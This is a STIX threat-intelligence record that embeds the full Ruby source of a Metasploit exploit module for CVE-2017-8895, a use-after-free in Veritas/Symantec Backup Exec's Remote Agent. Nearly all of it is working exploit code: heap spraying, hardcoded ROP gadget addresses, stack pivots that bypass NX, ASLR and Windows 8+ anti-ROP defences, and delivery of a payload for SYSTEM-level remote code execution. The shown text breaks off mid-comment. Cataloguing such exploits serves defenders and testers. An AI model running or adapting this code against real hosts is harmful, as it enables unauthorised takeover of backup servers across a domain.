{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--933a7771-4d51-4bd1-b411-d2665a960761",
    "created": "2024-08-14T16:50:15.218354Z",
    "modified": "2024-08-14T16:50:15.218358Z",
    "name": "Veritas/Symantec Backup Exec SSL NDMP Connection Use-After-Free",
    "description": " This module exploits a use-after-free vulnerability in the handling of SSL NDMP connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL is re-established on a NDMP connection that previously has had SSL established the BIO struct for the connection's previous SSL session is reused, even though it has previously been freed.  This module supports 3 specific versions of the Backup Exec agent in the 14, 15 and 16 series on 64-bit and 32-bit versions of Windows and has been tested from Vista to Windows 10. The check command can help narrow down what major and minor revision is installed and the precise of version of Windows, but some other information may be required to make a reliable choice of target.  NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a reliability of around 85%. On other versions of Windows, reliability is around 35% (due to the need to win a race condition across the network in this case; this may drop further depending on network conditions). The agent is normally installed on all hosts in a domain that need to be backed up, so if one service crashes, try again on another :) Successful exploitation will give remote code execution as the user of the Backup Exec Remote Agent for Windows service, almost always NT AUTHORITY\\SYSTEM.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/backupexec/ssl_uaf.rb",
            "external_id": "ssl_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8895"
        },
        {
            "source_name": "reference",
            "url": "https://www.veritas.com/content/support/en_US/security/VTS17-006.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nrequire 'openssl'\nrequire 'xdr'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::NDMPSocket\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Veritas/Symantec Backup Exec SSL NDMP Connection Use-After-Free',\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability in the handling of SSL NDMP\n        connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL\n        is re-established on a NDMP connection that previously has had SSL established,\n        the BIO struct for the connection's previous SSL session is reused, even though it\n        has previously been freed.\n\n        This module supports 3 specific versions of the Backup Exec agent in the 14, 15\n        and 16 series on 64-bit and 32-bit versions of Windows and has been tested from\n        Vista to Windows 10. The check command can help narrow down what major and minor\n        revision is installed and the precise of version of Windows, but some other\n        information may be required to make a reliable choice of target.\n\n        NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a\n        reliability of around 85%. On other versions of Windows, reliability is around 35%\n        (due to the need to win a race condition across the network in this case; this may\n        drop further depending on network conditions). The agent is normally installed on\n        all hosts in a domain that need to be backed up, so if one service crashes, try\n        again on another :) Successful exploitation will give remote code execution as the\n        user of the Backup Exec Remote Agent for Windows service, almost always\n        NT AUTHORITY\\SYSTEM.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Matthew Daley' ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-8895' ],\n          [ 'VTS', '17-006' ],\n          [ 'URL', 'https://www.veritas.com/content/support/en_US/security/VTS17-006.html' ]\n        ],\n      'Platform'       => 'win',\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [\n            'Backup Exec 14 (14.1 / revision 9.1), Windows >= 8 x64',\n            { 'Version' => 14, 'Arch' => ARCH_X64, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 14 (14.1 / revision 9.1), Windows >= 8 x86',\n            { 'Version' => 14, 'Arch' => ARCH_X86, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 14 (14.1 / revision 9.1), Windows <= 7 x64',\n            { 'Version' => 14, 'Arch' => ARCH_X64, 'Win8Upwards' => false }\n          ],\n          [\n            'Backup Exec 14 (14.1 / revision 9.1), Windows <= 7 x86',\n            { 'Version' => 14, 'Arch' => ARCH_X86, 'Win8Upwards' => false }\n          ],\n          [\n            'Backup Exec 15 (14.2 / revision 9.2), Windows >= 8 x64',\n            { 'Version' => 15, 'Arch' => ARCH_X64, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 15 (14.2 / revision 9.2), Windows >= 8 x86',\n            { 'Version' => 15, 'Arch' => ARCH_X86, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 15 (14.2 / revision 9.2), Windows <= 7 x64',\n            { 'Version' => 15, 'Arch' => ARCH_X64, 'Win8Upwards' => false }\n          ],\n          [\n            'Backup Exec 15 (14.2 / revision 9.2), Windows <= 7 x86',\n            { 'Version' => 15, 'Arch' => ARCH_X86, 'Win8Upwards' => false }\n          ],\n          [\n            'Backup Exec 16 (16.0 / revision 9.2), Windows >= 8 x64',\n            { 'Version' => 16, 'Arch' => ARCH_X64, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 16 (16.0 / revision 9.2), Windows >= 8 x86',\n            { 'Version' => 16, 'Arch' => ARCH_X86, 'Win8Upwards' => true }\n          ],\n          [\n            'Backup Exec 16 (16.0 / revision 9.2), Windows <= 7 x64',\n            { 'Version' => 16, 'Arch' => ARCH_X64, 'Win8Upwards' => false }\n          ],\n          [\n            'Backup Exec 16 (16.0 / revision 9.2), Windows <= 7 x86',\n            { 'Version' => 16, 'Arch' => ARCH_X86, 'Win8Upwards' => false }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT'              => 10000,\n          'NumTriggerAttempts' => 50,\n          'EXITFUNC'           => 'thread'\n        },\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-05-10',\n      'DefaultTarget'  => 8))\n\n    register_options([\n      OptInt.new('NumSpraySockets',    [ false, 'Number of sockets to spray stage 1 with' ]),\n      OptInt.new('NumTLSSpraySockets', [ false, 'Number of sockets to spray TLS extensions with' ]),\n      OptInt.new('NumTriggerAttempts', [ true,  'Number of attempts to trigger the vulnerability (Windows 8+ only)' ])\n    ])\n  end\n\n  def check\n    s = NDMP::Socket.new(connect)\n    return CheckCode::Unknown unless connect_ndmp(s, 2)\n\n    resp = s.do_request_response(NDMP::Message.new_request(NDMP::Message::CONFIG_GET_HOST_INFO))\n    return CheckCode::Unknown unless resp\n    info = HostInfoResponse.from_xdr(resp.body)\n    print_line('Hostname: ' + info.hostname)\n    print_line('OS type: ' + info.os_type)\n    print_line('OS version: ' + info.os_version)\n    print_line('Host ID: ' + info.host_id)\n\n    disconnect\n    s = NDMP::Socket.new(connect)\n    return CheckCode::Unknown unless connect_ndmp(s, 3)\n\n    resp = s.do_request_response(NDMP::Message.new_request(NDMP::Message::CONFIG_GET_SERVER_INFO))\n    return CheckCode::Unknown unless resp\n    info = ServiceInfoResponse.from_xdr(resp.body)\n    print_line('Vendor: ' + info.vendor_name)\n    print_line('Product: ' + info.product_name)\n    print_line('Revision: ' + info.revision_number)\n\n    ver = info.revision_number.split('.')\n    if ver[0].to_i < 9 || (ver[0].to_i == 9 && ver[1].to_i <= 2)\n      CheckCode::Appears\n    else\n      CheckCode::Detected\n    end\n  end\n\n  def exploit\n    print_status('Connecting sockets...')\n\n    # Connect a differing amount of sockets for stage 1 spraying depending on the target\n    spray_socks = connect_additional_sockets(\n      datastore['NumSpraySockets'] || (target.opts['Win8Upwards'] ? 100 : 200),\n      target.opts['Arch'] == ARCH_X64 && target.opts['Win8Upwards'] ? 2 : 3\n    )\n\n    # Likewise, connect a differing amount of sockets for TLS extension spraying depending\n    # on the target\n    num_tls_spray_socks = datastore['NumTLSSpraySockets'] || (\n      case target.opts['Version']\n      when 14\n        0\n      when 15\n        target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X86 ? 50 : 100\n      when 16\n        target.opts['Arch'] == ARCH_X64 ? 100 : 0\n      end\n    )\n    tls_spray_socks = connect_additional_sockets(num_tls_spray_socks, 3)\n\n    s = NDMP::Socket.new(connect)\n    unless connect_ndmp(s, 3)\n      fail_with(Failure::UnexpectedReply, \"Couldn't connect main socket\")\n    end\n\n    ca_cert, ca_key = generate_ca_cert_and_key\n    ca_cert_id = get_cert_id(ca_cert)\n    print_status(\"CA certificate ID = #{ca_cert_id.to_s(16)}\")\n\n    print_status('Getting and handling a certificate signing request...')\n    agent_cert = handle_a_csr(s, ca_cert, ca_key)\n    fail_with(Failure::UnexpectedReply, \"Couldn't sign certificate request\") if agent_cert.nil?\n    print_status(\"Agent certificate ID = #{get_cert_id(agent_cert).to_s(16)}\")\n\n    if target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X86 && target.opts['Version'] != 15\n      # For certain target types, put the stage 1 spray sockets into SSL mode. We can use\n      # the newly made CA certificate and key as our client side certificate\n      ssl_context = OpenSSL::SSL::SSLContext.new\n      ssl_context.cert = ca_cert\n      ssl_context.key = ca_key\n      print_status('Entering spray sockets into SSL mode...')\n      (1..2).each do |phase|\n        spray_socks.each do |ss|\n          require_empty_ssl_request(ss, SSLRequest::Opcode.test_cert, ca_cert_id, phase)\n          require_empty_ssl_request(ss, SSLRequest::Opcode.start_ssl, ca_cert_id, phase)\n          ss.wrap_with_ssl(ssl_context) if phase == 2\n        end\n      end\n    end\n\n    print_status('Testing certificate...')\n    require_empty_ssl_request(s, SSLRequest::Opcode.test_cert, ca_cert_id)\n\n    # For some targets, split the spraying of TLS extensions around entering SSL on the\n    # main socket\n    tls_cutoff = tls_spray_socks.length\n    if target.opts['Win8Upwards']\n      if target.opts['Arch'] == ARCH_X86\n        tls_cutoff /= 2\n      end\n    else\n      tls_cutoff /= 10\n    end\n    spray_tls_extensions(tls_spray_socks[0...tls_cutoff], ca_cert_id)\n\n    print_status('Entering SSL mode on main socket...')\n    require_empty_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id)\n\n    spray_tls_extensions(tls_spray_socks[tls_cutoff...tls_spray_socks.length], ca_cert_id)\n\n    # Send stages 2 to 4 in a TLS or SSLv2 handshake record. We do this so that the other\n    # stages are contained in the SSL socket buffer at the time of the UAF. The record\n    # itself could be considered stage 1.5 as stage 1 will pivot to somewhere within the\n    # record (depending on the amount of trigger attempts required; see attempt_triggers)\n    print_status('Sending stages 2 to 4...')\n    if target.opts['Arch'] == ARCH_X64\n      if target.opts['Version'] == 14\n        # x64, version 14. Use a TLS handshake record\n        #\n        #   Windows 8+:\n        #     Stage 1 jumps to 0x1d or 0x30 + [0, NumTriggerAttempts - 2] * 8\n        #          0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #      0 | 16 | 03 | 01 | length  | FILLER\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     10                                                                  | ret 3\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     20                          | ret                                   | FILLER       |\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     30 | retsled (0x10 aligned length)...                                              |\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     .. | stages 2-4...\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #\n        #   Otherwise:\n        #     Stage 1 jumps to 0x18\n        #          0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #      0 | 16 | 03 | 01 | length  | FILLER\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     10                                         | ret                                   |\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #     20 | stages 2-4...\n        #        +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n\n        ret = [0xbe6c897].pack('Q<')\n        if target.opts['Win8Upwards']\n          ret_3 = [0xbe2829b].pack('Q<')\n          payload = rand_text(24) + ret_3 + ret + rand_text(3) +\n                    ret * [0, (datastore['NumTriggerAttempts'] - 1) & ~1].max\n        else\n          payload = rand_text(19) + ret\n        end\n        payload << generate_stages_2_to_4\n\n        stage_tls = generate_tls_handshake_record(payload)\n      else\n        # x64, version 15/16. Use a SSLv2 hqndshake record\n        #   Windows 8+: Stage 1 jumps to 0x23 or 0x38 + [0, NumTriggerAttempts - 2] * 8\n        #   Otherwise: Stage 1 jumps to 0x18\n        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #    0 | length  | 01 | 03 | FILLER\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   10                                         | pop x3; ret                           |\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   20 | FILLER       | ret 5                                 | ret\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   30                | FILLER                 | retsled (0x8 aligned length)...       |\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   40 | stages 2 - 4...\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n\n        pop_x3 = [0xbe1d920].pack('Q<')\n        ret_5 = [target.opts['Version'] == 15 ? 0xbe61731 : 0xbe62c16].pack('Q<')\n        ret = [0xbe6c897].pack('Q<')\n        payload = rand_text(20) + pop_x3 + rand_text(3) + ret_5 + ret + rand_text(5) +\n                  ret * [1, (datastore['NumTriggerAttempts'] & ~1) - 1].max +\n                  generate_stages_2_to_4\n\n        stage_tls = generate_tls_in_sslv2_clienthello(payload)\n      end\n    else\n      if target.opts['Version'] == 14\n        # x86, version 14. Use a TLS handshake record\n        #   Windows 8+: Stage 1 jumps to 0x9 or 0x14 + [0, NumTriggerAttempts - 2] * 4\n        #   Otherwise: Stage 1 jumps to 0x4\n        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #    0 | 16 | 03 | 01 | ln | pop x3; ret       | FL | ret 3             | ret\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   10      | FILLER       | retsled...        | stages 2 to 4...\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n\n        pop_x3 = [0x6311f901].pack('L<')\n        ret_3 = [0x6312164a].pack('L<')\n        ret = [0x63101514].pack('L<')\n        payload = (pop_x3[1...pop_x3.length] + rand_char + ret_3 + ret + rand_text(3) +\n                   ret * [0, datastore['NumTriggerAttempts'] - 2].max + generate_stages_2_to_4)\n\n        stage_tls = generate_tls_handshake_record(payload, pop_x3[0])\n      else\n        # x86, version 15/16. Use a SSLv2 hqndshake record\n        #   Windows 8+: Stage 1 jumps to 0xf or 0x14 + [0, NumTriggerAttempts - 2] * 4\n        #   Otherwise: Stage 1 jumps to 0x4\n        #        0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #    0 | length  | 01 | 03 | add esp, 0xc; ret | FILLER                           | inc esp; ret\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n        #   10                | FL | retsled...        | stages 2 to 4...\n        #      +----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+\n\n        add_esp_0xc = [target.opts['Version'] == 15 ? 0x6312890f : 0x6312898f].pack('L<')\n        inc_esp = [target.opts['Version'] == 15 ? 0x6311c68c : 0x63137b1b].pack('L<')\n        ret = [0x63101564].pack('L<')\n        payload = add_esp_0xc + rand_text(7) + inc_esp + rand_char +\n                  ret * [0, datastore['NumTriggerAttempts'] - 3].max +\n                  generate_stages_2_to_4\n\n        stage_tls = generate_tls_in_sslv2_clienthello(payload)\n      end\n    end\n    s.raw_sendall(stage_tls, 0)\n    if target.opts['Version'] == 14\n      resp = s.raw_recv(5)\n      fail_with(Failure::UnexpectedReply, 'Failed to read TLS handshake response. Are you sure you selected the right target version?') if resp.empty?\n      s.raw_recv(resp[3...5].unpack('n')[0])\n    end\n\n    print_status('Closing TLS spray sockets...')\n    tls_spray_socks.reverse! unless target.opts['Win8Upwards']\n    tls_spray_socks.each do |ts|\n      ts.close\n      sleep(0.1)\n    end\n    sleep(1)\n\n    # Spray stage 1 in the string payloads of selected NDMP packet types\n    if target.opts['Win8Upwards'] && target.opts['Arch'] == ARCH_X64\n      spray_payload = XDR::String[].to_xdr(generate_stage_1[0...-1])\n      spray_msg_type = NDMP::Message::CONFIG_GET_BUTYPE_ATTR\n    else\n      spray_payload = XDR::Int.to_xdr(1) + XDR::String[].to_xdr(generate_stage_1[0...-1]) * 2\n      spray_msg_type = NDMP::Message::CONNECT_CLIENT_AUTH\n    end\n    spray_msg = NDMP::Message.new_request(spray_msg_type, spray_payload)\n\n    # We need to be able to detect as soon as a connection is made to the payload in order\n    # to stop spraying/trigger attempts ASAP\n    @payload_connected = false\n    if payload_instance.respond_to?(:handle_connection)\n      old_handle_connect = payload_instance.method(:handle_connection)\n      payload_instance.define_singleton_method(:handle_connection) do |*args|\n        @payload_connected = true\n        old_handle_connect.call(*args)\n      end\n    end\n\n    if target.opts['Win8Upwards']\n      # After this SSL request, the BIO struct is freed but still referred to in the new\n      # SSL context\n      print_status('Re-entering SSL mode on main socket...')\n      require_empty_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id)\n\n      # Attempt to overwrite the BIO struct with stage 1 and trigger the UAF\n      attempt_triggers(s, spray_socks, spray_msg)\n    else\n      # Attempt to overwrite the BIO struct with stage 1 and trigger the UAF in a race\n      attempt_race(s, spray_socks, spray_msg, ca_cert_id)\n    end\n\n    handler\n  end\n\n  private\n\n  SSL_HANDSHAKE_REQUEST = 0xf383\n\n  class SSLRequest < XDR::Struct\n    class Opcode < XDR::Enum\n      member :test_cert, 1\n      member :get_csr_req, 2\n      member :give_signed_cert, 3\n      member :start_ssl, 4\n      seal\n    end\n\n    attribute :opcode,            Opcode\n    attribute :media_server_name, XDR::String[]\n    attribute :media_server_fqdn, XDR::String[]\n    attribute :media_server_addr, XDR::String[]\n    attribute :cert_id_1,         XDR::Int\n    attribute :cert_id_2,         XDR::Int\n    attribute :unknown1,          XDR::Int\n    attribute :unknown2,          XDR::Int\n    attribute :unknown3,          XDR::Int\n    attribute :ca_cert,           XDR::String[]\n    attribute :unknown4,          XDR::Int\n    attribute :agent_cert,        XDR::String[]\n\n    def self.new_for_opcode(opcode)\n      new(\n        :opcode            => opcode,\n        :media_server_name => 'foo',\n        :media_server_fqdn => 'foo',\n        :media_server_addr => 'foo',\n        :cert_id_1         => 0,\n        :cert_id_2         => 0,\n        :unknown1          => 0,\n        :unknown2          => 0,\n        :unknown3          => 0,\n        :ca_cert           => '',\n        :unknown4          => 0,\n        :agent_cert        => ''\n      )\n    end\n  end\n\n  class SSLResponse < XDR::Struct\n    attribute :unknown1, XDR::Int\n    attribute :unknown2, XDR::String[]\n    attribute :unknown3, XDR::Int\n    attribute :unknown4, XDR::String[]\n\n    def empty?\n      (attributes[:unknown1].zero? && attributes[:unknown2].empty? &&\n       attributes[:unknown3].zero? && attributes[:unknown4].empty?)\n    end\n  end\n\n  class ServiceInfoResponse < XDR::Struct\n    attribute :error,           XDR::Int\n    attribute :vendor_name,     XDR::String[]\n    attribute :product_name,    XDR::String[]\n    attribute :revision_number, XDR::String[]\n    attribute :auth_types,      XDR::VarArray[XDR::Int]\n  end\n\n  class HostInfoResponse < XDR::Struct\n    attribute :error,      XDR::Int\n    attribute :hostname,   XDR::String[]\n    attribute :os_type,    XDR::String[]\n    attribute :os_version, XDR::String[]\n    attribute :host_id,    XDR::String[]\n    attribute :unknown,    XDR::VarArray[XDR::Int]\n  end\n\n  #\n  # Perform NDMP connection handshake on a NDMP socket. Can be split into 3 stages.\n  #\n  def connect_ndmp(s, version, phase=nil)\n    if phase.nil? || phase == 1\n      return false unless s.read_ndmp_msg(NDMP::Message::NOTIFY_CONNECTED)\n    end\n\n    if phase.nil? || phase == 2\n      return false unless s.prepare_and_write_ndmp_msg(\n        NDMP::Message.new_request(NDMP::Message::CONNECT_OPEN, XDR::Int.to_xdr(version))\n      )\n    end\n\n    if phase.nil? || phase == 3\n      msg = s.read_ndmp_msg(NDMP::Message::CONNECT_OPEN)\n      return false unless msg\n      fail_with(Failure::UnexpectedReply, 'Bad connect result') unless XDR::Int.from_xdr(msg.body).zero?\n    end\n\n    true\n  end\n\n  #\n  # Connect multiple NDMP sockets of a given version. Parallelizes over connection phases.\n  #\n  def connect_additional_sockets(num_socks, version)\n    socks = (0...num_socks).map do\n      NDMP::Socket.new(connect(false))\n    end\n\n    (1..3).each do |phase|\n      socks.each do |ss|\n        unless connect_ndmp(ss, version, phase)\n          fail_with(Failure::UnexpectedReply, \"Couldn't connect NDMP socket (phase #{phase})\")\n        end\n      end\n    end\n\n    socks\n  end\n\n  #\n  # Send a Backup Exec-specific SSL NDMP request and receive the response.\n  #\n  def do_simple_ssl_request(s, opcode, ca_cert_id, phase=nil)\n    if phase.nil? || phase == 1\n      req = SSLRequest.new_for_opcode(opcode)\n      req.cert_id_1 = req.cert_id_2 = ca_cert_id\n      msg = NDMP::Message.new_request(SSL_HANDSHAKE_REQUEST, req.to_xdr)\n\n      if block_given?\n        last = s.prepare_and_write_ndmp_msg(msg, true)\n        return nil unless last\n        sleep(1)\n        yield true\n        s.raw_sendall(last, 0)\n        yield false\n      else\n        return nil unless s.prepare_and_write_ndmp_msg(msg)\n      end\n    end\n\n    if phase.nil? || phase == 2\n      msg = s.read_ndmp_msg(SSL_HANDSHAKE_REQUEST)\n      return msg ? SSLResponse.from_xdr(msg.body) : nil\n    end\n\n    nil\n  end\n\n  #\n  # Send a Backup Exec SSL NDMP request and receive the response, requiring the response\n  # to be empty.\n  #\n  def require_empty_ssl_request(s, opcode, ca_cert_id, phase=nil)\n    resp = do_simple_ssl_request(s, opcode, ca_cert_id, phase)\n    if phase.nil? || phase == 2\n      fail_with(Failure::UnexpectedReply, \"Failed to perform SSL request/response (opcode #{opcode})\") unless resp\n      fail_with(Failure::UnexpectedReply, \"Non-empty SSL response (opcode #{opcode}) result\") unless resp.empty?\n    end\n  end\n\n  #\n  # Get the ID Backup Exec uses to identify a x509 certificate. This is the first 4 bytes\n  # of the SHA-1 of the issuer and the raw serial number.\n  #\n  def get_cert_id(cert)\n    Digest::SHA1.digest(cert.issuer.to_s + cert.serial.to_s(2))[0...4].unpack('L<')[0]\n  end\n\n  #\n  # Create a self-signed CA certificate and matching key.\n  #\n  def generate_ca_cert_and_key(key_len=2048)\n    ca_key = OpenSSL::PKey::RSA.new(key_len)\n\n    ca_cert = OpenSSL::X509::Certificate.new\n    ca_cert.version    = 3\n    ca_cert.serial     = 1\n    ca_cert.subject    = ca_cert.issuer = OpenSSL::X509::Name.parse('/CN=SSL UAF')\n    ca_cert.not_before = Time.now - 60 * 60 * 24\n    ca_cert.not_after  = Time.now + 60 * 60 * 24 * 365\n    ca_cert.public_key = ca_key.public_key\n\n    extn_factory = OpenSSL::X509::ExtensionFactory.new(ca_cert, ca_cert)\n    ca_cert.extensions = [\n      extn_factory.create_extension('subjectKeyIdentifier', 'hash'),\n      extn_factory.create_extension('basicConstraints', 'critical,CA:true')\n    ]\n    # Have to do this after creating subjectKeyIdentifier extension\n    ca_cert.add_extension(extn_factory.create_extension('authorityKeyIdentifier', 'keyid:always,issuer'))\n\n    ca_cert.sign(ca_key, OpenSSL::Digest.new('SHA256'))\n\n    [ca_cert, ca_key]\n  end\n\n  #\n  # Get and handle a certificate signing request from Backup Exec with the given CA\n  # certificate and key.\n  #\n  def handle_a_csr(s, ca_cert, ca_key)\n    resp = do_simple_ssl_request(s, SSLRequest::Opcode.get_csr_req, 0)\n    return nil if resp.nil?\n    request = OpenSSL::X509::Request.new(resp.unknown2)\n\n    agent_cert = OpenSSL::X509::Certificate.new\n    agent_cert.version    = 3\n    agent_cert.serial     = 2\n    agent_cert.subject    = request.subject\n    agent_cert.issuer     = ca_cert.subject\n    agent_cert.not_before = Time.now - 60 * 60 * 24\n    agent_cert.not_after  = Time.now + 60 * 60 * 24 * 365\n    agent_cert.public_key = request.public_key\n\n    extn_factory = OpenSSL::X509::ExtensionFactory.new(ca_cert, agent_cert)\n    agent_cert.extensions = [\n      extn_factory.create_extension('subjectKeyIdentifier', 'hash'),\n      extn_factory.create_extension('basicConstraints', 'critical,CA:false')\n    ]\n    # Have to do this after creating subjectKeyIdentifier extension\n    agent_cert.add_extension(extn_factory.create_extension('authorityKeyIdentifier', 'keyid:always,issuer'))\n\n    agent_cert.sign(ca_key, OpenSSL::Digest.new('SHA256'))\n\n    req = SSLRequest.new_for_opcode(SSLRequest::Opcode.give_signed_cert)\n    req.ca_cert = ca_cert.to_s\n    req.agent_cert = agent_cert.to_s\n    return nil unless s.do_request_response(NDMP::Message.new_request(SSL_HANDSHAKE_REQUEST, req.to_xdr))\n\n    agent_cert\n  end\n\n  #\n  # Generate a TLS handshake record with the given payload.\n  #\n  def generate_tls_handshake_record(payload, required_fifth_byte=nil)\n    fail_with(Failure::Unknown, 'No payload') if payload.empty?\n\n    # Stage 1 for the x86 version 14 target jumps into the TLS header itself (at offset\n    # 0x4) instead of in non-header data; here it's necessary to control the 5th byte of\n    # the header, which is the second byte of the length word\n    unless required_fifth_byte.nil?\n      payload << rand_text((required_fifth_byte.ord - (payload.length & 0xff)) % 0x100)\n    end\n    \"\\x16\\x03\\x01\" + [payload.length].pack('n') + payload\n  end\n\n  #\n  # Generate a TLS ClientHello record with the given Random and extensions (ie. for\n  # holding stages 2-4).\n  #\n  def generate_tls_clienthello(curves_extn_payload, ec_formats_extn_payload, random)\n    if ec_formats_extn_payload.empty? && curves_extn_payload.empty?\n      fail_with(Failure::Unknown, 'No TLS extension payloads given')\n    end\n    if ec_formats_extn_payload.length > 0xff\n      fail_with(Failure::Unknown, 'Bad EC formats extension length')\n    end\n    if curves_extn_payload.length.odd? || curves_extn_payload.length > 0xffff\n      fail_with(Failure::Unknown, 'Bad curves extension length')\n    end\n    if random.length != 0x20\n      fail_with(Failure::Unknown, 'Bad random length')\n    end\n\n    extns = ''\n    unless curves_extn_payload.empty?\n      extns << [\n        10,\n        curves_extn_payload.length + 2,\n        curves_extn_payload.length\n      ].pack('n*') + curves_extn_payload\n    end\n    unless ec_formats_extn_payload.empty?\n      extns << [\n        11,\n        ec_formats_extn_payload.length + 1,\n        ec_formats_extn_payload.length\n      ].pack('nnC') + ec_formats_extn_payload\n    end\n\n    r = \"\\x03\\x03\" + random + \"\\x00\\x00\\x02\\x00\\x2f\\x01\\x00\"\n    r << [extns.length].pack('n') + extns\n\n    r = \"\\x01\" + [r.length].pack('N')[1...4] + r\n\n    generate_tls_handshake_record(r)\n  end\n\n  #\n  # Generate a TLS ClientHello record in a SSLv2 record with a given payload.\n  #\n  def generate_tls_in_sslv2_clienthello(payload)\n    fail_with(Failure::Unknown, 'No payload') if payload.empty?\n    fail_with(Failure::Unknown, 'Bad first byte') unless payload[0].ord >= 1\n\n    r = \"\\x01\\x03\" + payload\n    [r.length | 0x8000].pack('n') + r\n  end\n\n  #\n  # Spray a bunch of TLS extensions from the given NDMP sockets. Used for heap feng shui.\n  #\n  def spray_tls_extensions(tls_spray_socks, ca_cert_id)\n    payload_len = target.opts['Arch'] == ARCH_X64 ? 0x68 : 0x40\n    spray = generate_tls_clienthello(rand_text(payload_len), rand_text(payload_len), rand_text(0x20))\n\n    print_status('Spraying TLS extensions...')\n    (1..2).each do |phase|\n      tls_spray_socks.each do |ts|\n        require_empty_ssl_request(ts, SSLRequest::Opcode.test_cert, ca_cert_id, phase)\n        require_empty_ssl_request(ts, SSLRequest::Opcode.start_ssl, ca_cert_id, phase)\n\n        if phase == 2\n          ts.raw_sendall(spray, 0)\n          sleep(0.1)\n        end\n      end\n    end\n    sleep(1)\n  end\n\n  #\n  # Generate stage 1.\n  #\n  # This stage is what overwrites the freed BIO struct. It consists of a non-zero readable\n  # location (to prevent Backup Exec from falling over or failing) and a stack pivot to\n  # some offset from the current SSL socket buffer read location, which will hold a\n  # TLS/SSLv2 record (from the previous SSL connection) holding stages 2-4. The pivot\n  # offset will be different at each UAF trigger attempt; see attempt_triggers).\n  #\n  def generate_stage_1\n    if target.opts['Arch'] == ARCH_X64\n      stage_1 = [\n        # +0x18 from here is a non-zero, readable location. This is the load address of\n        # becrypto.dll (which is non-ASLR)\n        0xbe00000,\n        # On x64, we pivot into the current SSL socket buffer read location + 0x18\n        # lea rsp, qword ptr [rbp + 0x10]; pop rbp; ret\n        [0xbe5ecf2, 0xbe23261, 0xbe2329b][target.opts['Version'] - 14]\n      ].pack('Q<*')\n    else\n      stage_1 = [\n        # +0x18 from here is a non-zero, readable location. This is the load address of\n        # becrypto.dll (which is non-ASLR)\n        0x63100000,\n        # On x86, we pivot into the current SSL socket buffer read location + 0x4\n        # mov esp, ebp; pop ebp; ret\n        target.opts['Version'] == 14 ? 0x631017fd : 0x6310184d\n      ].pack('L<*')\n    end\n    stage_1 + rand_text((target.opts['Arch'] == ARCH_X64 ? 0x68 : 0x40) - stage_1.length)\n  end\n\n  #\n  # Generate stages 2 to 4.\n  #\n  # Stage 2 is a ROP chain that copies stages 3 and 4 from the heap (that stage 1 pivoted\n  # to) onto the stack, bypassing Windows 8+'s check before certain functions (like\n  # VirtualProtect) that we have called them from within expected stack memory instead of\n  # the heap.\n  #\n  # Stage 3 is a ROP chain that calls VirtualProtect to mark stages 3 and 4 as executable\n  # (but we only really need stage 4 executable anyway).\n  #\n  # Stage 4 is the user-selected Metasploit payload 